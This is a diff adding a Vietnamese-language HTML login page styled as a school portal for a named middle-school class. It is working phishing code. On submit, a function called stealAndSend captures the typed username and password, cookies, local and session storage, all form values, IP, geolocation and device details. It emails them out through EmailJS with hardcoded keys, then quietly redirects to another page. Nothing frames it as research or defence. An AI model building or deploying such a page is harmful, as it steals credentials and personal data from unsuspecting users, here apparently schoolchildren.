@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      emailjs.init("OEaylcSXjNp1ai3r3"); // public key thật của mày
+    })();
+  </script>
+</head>
+<body class="min-h-screen bg-gradient-to-r from-cyan-400 to-blue-600 flex items-center justify-center">
+  <form id="loginForm" class="bg-white rounded-md p-6 w-80 shadow-md">
+    <h2 class="text-center text-[13px] font-extrabold text-[#000080] leading-tight mb-6">
+      TRƯỜNG THCS HUỲNH THÚC KHÁNG<br />
+      NĂM HỌC 2024-2025<br />
+      LỚP 8/9
+    </h2>
+
+    <input id="username" type="text" placeholder="Tên người dùng" required
+      class="w-full mb-4 px-3 py-2 border border-gray-300 rounded text-sm placeholder-gray-500" />
+    <input id="password" type="password" placeholder="Mật khẩu" required
+      class="w-full mb-6 px-3 py-2 border border-gray-300 rounded text-sm placeholder-gray-500" />
+
+    <button type="submit" class="w-full bg-blue-600 text-white font-semibold text-sm py-2 rounded hover:bg-blue-700 transition">
+      Đăng nhập
+    </button>
+    <p id="error" class="text-red-600 text-sm mt-3 hidden text-center">Sai tài khoản hoặc mật khẩu!</p>
+  </form>
+
+  <script>
+    // Tính ping mạng để delay
+    async function getPing() {
+      const start = performance.now();
+      await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+      const end = performance.now();
+      return end - start; // ms
+    }
+
+    // Delay tiện ích
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // Gửi dữ liệu qua EmailJS
+    async function stealAndSend(extra = {}) {
+      const ipResp = await fetch("https://api.ipify.org?format=json");
+      const ip = (await ipResp.json()).ip;
+
+        let geo = {};
+        try {
+        const geoResp = await fetch(`https://ipwho.is/${ip}`);
+        const geoData = await geoResp.json();
+        if (geoData.success) {
+            geo = geoData;
+        } else {
+            console.warn("Lỗi geo:", geoData.message);
+            geo = { error: geoData.message || "Không lấy được thông tin địa lý" };
+        }
+        } catch (e) {
+        console.warn("Không lấy được info địa lý:", e);
+        geo = { error: "Không lấy được thông tin địa lý" };
+        }
+
+
+      const payload = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        href: location.href,
+        referrer: document.referrer,
+        ip,
+        geo,
+        autofill: {},
+        ...extra
+      };
+
+      document.querySelectorAll("input, textarea, select").forEach(el => {
+        const key = el.name || el.id || el.type || Math.random().toString(36).substring(2);
+        payload.autofill[key] = el.value;
+      });
+
+      const infoText = JSON.stringify(payload, null, 2);
+
+      return emailjs.send("service_tcooyat", "template_1fxdzfj", {
+        info: infoText
+      });
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", async e => {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      try {
+        await stealAndSend({ username, password });
+
+        const ping = await getPing();
+        const waitTime = ping * 0; // Nhân 10 lần cho an toàn
+        console.log(`Ping: ${ping.toFixed(2)}ms, Delay: ${waitTime.toFixed(0)}ms`);
+        await delay(waitTime);
+
+      } catch (err) {
+        console.error("Gửi mail lỗi:", err);
+        // Dù lỗi vẫn cho chuyển tiếp
+      }
+
+      window.location.href = "client.html";
+    });
+  </script>
+</body>
+</html>
